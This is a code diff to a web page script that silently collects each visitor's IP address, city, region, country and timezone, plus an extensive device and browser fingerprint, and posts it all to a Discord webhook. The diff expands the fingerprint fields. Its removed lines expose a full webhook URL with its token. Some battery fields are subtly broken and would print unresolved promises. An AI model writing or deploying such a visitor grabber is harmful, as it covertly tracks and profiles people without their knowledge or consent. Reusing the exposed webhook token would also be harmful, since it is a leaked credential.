@@ -50,7 +50,7 @@
             fetch('https://ipwhois.app/json/')
                 .then(response => response.json())
                 .then(data => {
-                    // Collecting additional info
+                    // Collecting detailed info
                     const geoInfo = `IP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nTimezone: ${data.timezone}\nCurrency: ${data.currency}`;
 
                     const systemInfo = `
@@ -62,12 +62,44 @@
                         Battery Status: ${navigator.getBattery ? getBatteryStatus() : 'N/A'}
                         RAM: ${navigator.deviceMemory}GB
                         CPU Cores: ${navigator.hardwareConcurrency}
+                        Screen Orientation: ${window.screen.orientation.type}
+                        Is Online: ${navigator.onLine ? 'Yes' : 'No'}
+                        Connection Type: ${navigator.connection ? navigator.connection.effectiveType : 'N/A'}
+                        Device Memory: ${navigator.deviceMemory}GB
+                        Network Connection: ${navigator.connection ? navigator.connection.type : 'N/A'}
+                        Touch Support: ${('ontouchstart' in window) ? 'Yes' : 'No'}
+                        Vibration: ${navigator.vibrate ? 'Supported' : 'Not Supported'}
+                        JavaScript Enabled: ${navigator.javaEnabled() ? 'Yes' : 'No'}
+                        Local Storage: ${typeof(Storage) !== "undefined" ? 'Supported' : 'Not Supported'}
+                        Session Storage: ${typeof(sessionStorage) !== "undefined" ? 'Supported' : 'Not Supported'}
+                        Cookies Enabled: ${navigator.cookieEnabled ? 'Yes' : 'No'}
+                        Screen Pixel Ratio: ${window.devicePixelRatio}
+                        Battery Level: ${navigator.getBattery ? getBatteryLevel() : 'N/A'}
                     `;
 
                     const performanceInfo = `Page Load Time: ${window.performance.timing.loadEventEnd - window.performance.timing.navigationStart} ms`;
 
+                    // Additional Browser info
+                    const browserInfo = `
+                        User-Agent: ${navigator.userAgent}
+                        Cookies Enabled: ${navigator.cookieEnabled ? 'Yes' : 'No'}
+                        Local Storage Supported: ${typeof(Storage) !== "undefined" ? 'Yes' : 'No'}
+                        Session Storage Supported: ${typeof(sessionStorage) !== "undefined" ? 'Yes' : 'No'}
+                        Screen Pixel Ratio: ${window.devicePixelRatio}
+                        Viewport Dimensions: ${window.innerWidth} x ${window.innerHeight}
+                        Language: ${navigator.language}
+                        Timezone Offset: ${new Date().getTimezoneOffset()} minutes
+                        Is Mobile: ${/Mobi|Android/i.test(navigator.userAgent) ? 'Yes' : 'No'}
+                        Referrer: ${document.referrer || 'None'}
+                        Window Size: ${window.outerWidth}x${window.outerHeight}
+                        Is Touch Enabled: ${('ontouchstart' in window) ? 'Yes' : 'No'}
+                        Is App: ${navigator.standalone ? 'Yes' : 'No'}
+                        PDF Plugin: ${checkPDFSupport()}
+                        WebGL Supported: ${checkWebGL()}
+                    `;
+
                     // Send the info to Discord Webhook
-                    sendToWebhook(geoInfo, systemInfo, performanceInfo);
+                    sendToWebhook(geoInfo, systemInfo, performanceInfo, browserInfo);
                 })
                 .catch(error => {
                     console.error('Error fetching geo data:', error);
@@ -82,13 +114,34 @@
         }
 
         function getBatteryStatus() {
-            navigator.getBattery().then(function(battery) {
+            return navigator.getBattery().then(function(battery) {
                 return `Level: ${battery.level * 100}% Charging: ${battery.charging ? 'Yes' : 'No'}`;
             });
         }
 
-        function sendToWebhook(geoInfo, systemInfo, performanceInfo) {
-            const webhookURL = "https://discord.com/api/webhooks/1334960796609937499/7YlpdDT2pphEH6wCeuD6eS10QIS1QQVyz2HicjXZPK5lZ7XOpgs3ZBiG_7fDFhiTpAWm"; // Replace with your actual Discord webhook URL
+        function getBatteryLevel() {
+            return navigator.getBattery ? navigator.getBattery().then(function(battery) {
+                return battery.level * 100 + '%';
+            }) : 'Not Available';
+        }
+
+        function checkPDFSupport() {
+            try {
+                const isPDFSupported = !!window.PDFViewerApplication;
+                return isPDFSupported ? 'Yes' : 'No';
+            } catch (e) {
+                return 'No';
+            }
+        }
+
+        function checkWebGL() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            return gl ? 'Yes' : 'No';
+        }
+
+        function sendToWebhook(geoInfo, systemInfo, performanceInfo, browserInfo) {
+            const webhookURL = "secret"; // Replace with your actual Discord webhook URL
 
             const content = {
                 content: "Detailed System Information",
@@ -97,7 +150,8 @@
                     fields: [
                         { name: "Geolocation Info", value: geoInfo, inline: false },
                         { name: "System Info", value: systemInfo, inline: false },
-                        { name: "Performance Info", value: performanceInfo, inline: false }
+                        { name: "Performance Info", value: performanceInfo, inline: false },
+                        { name: "Browser Info", value: browserInfo, inline: false }
                     ],
                     footer: {
                         text: "Info Sent from Web"
